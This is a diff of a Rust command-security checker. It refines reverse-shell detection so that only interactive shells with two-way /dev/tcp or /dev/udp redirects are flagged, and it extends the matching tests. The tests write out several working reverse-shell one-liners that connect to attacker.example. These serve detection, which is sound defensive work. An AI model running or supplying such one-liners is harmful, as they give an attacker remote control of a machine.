@@ -5056,6 +5056,77 @@ fn is_base64_decode_exec_body(joined_lower: &str) -> bool {
         || (joined_lower.contains("buffer.from") && joined_lower.contains("eval"))
 }
 
+fn is_interactive_shell(command: &str, args: &[String], shell: ShellType) -> bool {
+    if !matches!(
+        normalize_cmd_base(command, shell).as_str(),
+        "sh" | "bash" | "zsh" | "dash" | "ksh" | "ash" | "mksh"
+    ) {
+        return false;
+    }
+
+    for arg in args {
+        let arg = normalize_shell_token(arg, shell);
+        if arg == "-c" || arg == "--command" {
+            break;
+        }
+        if arg == "--interactive"
+            || (arg.starts_with('-')
+                && !arg.starts_with("--")
+                && arg[1..].chars().any(|flag| flag == 'i'))
+        {
+            return true;
+        }
+    }
+    false
+}
+
+/// `/dev/tcp` and `/dev/udp` are also used for ordinary one-way probes. A
+/// reverse shell needs the network descriptor connected in both directions.
+fn has_duplex_dev_net_redirect(raw: &str) -> bool {
+    let compact: String = raw.chars().filter(|ch| !ch.is_whitespace()).collect();
+    let has_dev_net = compact.contains("/dev/tcp/") || compact.contains("/dev/udp/");
+
+    // The common `bash -i >& /dev/tcp/H/P 0>&1` form, plus equivalent
+    // spellings that duplicate stdout onto stdin.
+    if has_dev_net
+        && (compact.contains(">&/dev/tcp/")
+            || compact.contains(">&/dev/udp/")
+            || compact.contains(">/dev/tcp/")
+            || compact.contains(">/dev/udp/"))
+        && (compact.contains("0>&1") || compact.contains("0<&1"))
+    {
+        return true;
+    }
+
+    // Input opened directly from the socket, with output duplicated back to
+    // that same descriptor.
+    if (compact.contains("</dev/tcp/") || compact.contains("</dev/udp/"))
+        && (compact.contains("1>&0") || compact.contains(">&0"))
+    {
+        return true;
+    }
+
+    // Named read/write descriptor: `5<>/dev/tcp/H/P 0<&5 1>&5`.
+    for marker in ["<>/dev/tcp/", "<>/dev/udp/"] {
+        let mut search_from = 0usize;
+        while let Some(relative) = compact[search_from..].find(marker) {
+            let marker_start = search_from + relative;
+            let fd_start = compact[..marker_start]
+                .rfind(|ch: char| !ch.is_ascii_digit())
+                .map_or(0, |index| index + 1);
+            let fd = &compact[fd_start..marker_start];
+            if !fd.is_empty()
+                && (compact.contains(&format!("0<&{fd}")) || compact.contains(&format!("0>&{fd}")))
+                && (compact.contains(&format!("1>&{fd}")) || compact.contains(&format!("1<&{fd}")))
+            {
+                return true;
+            }
+            search_from = marker_start + marker.len();
+        }
+    }
+    false
+}
+
 /// Reverse/bind-shell shapes (PR3): a bash `/dev/tcp` | `/dev/udp` net redirect,
 /// `nc`/`ncat`/`netcat` with an exec-on-connect flag, or `socat … EXEC:`/`SYSTEM:`.
 /// Interpreter socket reverse shells go to
@@ -5069,13 +5140,17 @@ fn check_reverse_shell(
     for seg in segments {
         // (a) bash /dev/tcp | /dev/udp network redirect — a literal, quoting-proof
         //     marker used almost exclusively for back-connects.
-        let has_dev_net = seg.raw.contains("/dev/tcp/") || seg.raw.contains("/dev/udp/");
+        let carries_dev_net = seg.raw.contains("/dev/tcp/") || seg.raw.contains("/dev/udp/");
+        let mut has_dev_net = false;
 
         // (b)/(c) tool-based shapes keyed on the resolved command base.
         let mut tool_shape: Option<&str> = None;
         match resolve_effective_segment(seg, shell) {
             Ok(effective) => {
                 if let Some(ref cmd) = effective.command {
+                    has_dev_net = carries_dev_net
+                        && is_interactive_shell(cmd, &effective.args, shell)
+                        && has_duplex_dev_net_redirect(&seg.raw);
                     match normalize_cmd_base(cmd, shell).as_str() {
                         "nc" | "ncat" | "netcat" => {
                             let has_exec_flag = effective.args.iter().any(|a| {
@@ -15663,21 +15738,27 @@ mod tests {
 
     #[test]
     fn dev_tcp_requires_interactive_duplex_shell() {
-        let reverse = check_default(
+        for command in [
             "bash -i >& /dev/tcp/attacker.example/4444 0>&1",
-            ShellType::Posix,
-        );
-        assert!(
-            reverse
-                .iter()
-                .any(|finding| finding.rule_id == RuleId::ReverseShell),
-            "interactive duplex shell must still be detected: {reverse:?}"
-        );
+            "env bash -i > /dev/udp/attacker.example/53 2>&1 0<&1",
+            "sh -i 5<> /dev/tcp/attacker.example/4444 0<&5 1>&5 2>&5",
+        ] {
+            let reverse = check_default(command, ShellType::Posix);
+            assert!(
+                reverse
+                    .iter()
+                    .any(|finding| finding.rule_id == RuleId::ReverseShell),
+                "interactive duplex shell must still be detected: {command:?}; {reverse:?}"
+            );
+        }
 
         for probe in [
             "bash -c 'echo > /dev/tcp/example.com/443'",
             "printf ping > /dev/tcp/example.com/443",
             "bash -i -c 'echo > /dev/tcp/example.com/443'",
+            "bash -i > /dev/tcp/example.com/443 2>&1",
+            "bash -i < /dev/tcp/example.com/443",
+            "bash -i 5<> /dev/tcp/example.com/443",
         ] {
             let findings = check_default(probe, ShellType::Posix);
             assert!(
